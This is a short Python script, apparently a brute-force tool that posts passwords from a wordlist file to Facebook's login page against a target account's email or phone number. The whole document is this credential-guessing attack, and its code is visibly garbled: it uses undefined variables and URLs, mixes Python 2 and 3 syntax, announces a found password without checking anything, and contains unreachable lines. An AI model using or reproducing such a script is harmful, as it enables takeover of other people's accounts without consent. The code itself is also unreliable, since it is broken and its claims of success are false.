import requests

ID_USERNAME = "email"
ID_PASSWORD = "pass"
FB_URL = 'http://facebook.com/login.php'

def try_password():
    payload = {ID_USERNAME : email, ID_PASSWORD : password}

    resp = requests.get(FB_URL)
    print("Response to GET request: %s" %resp.content)

    resp = requests.post(SIGNUP_URL, payload)
    print "Found password"

PASSWORD_FILE="password.txt"
password= open(PASSWORD_FILE, 'r').read().split("\n")
print("Password file selected: ", PASSWORD_FILE)
email = input('Target account Email/Number: ').strip()

for index, password in zip(range(password_data.__len__()), password_data):
	password = password.strip()
	if len(password) < MIN_PASSWORD_LENGTH:
		continue
		print("Trying password index[", index, "]" )

	if __name__ == '__main__':
		if try_password():
			break
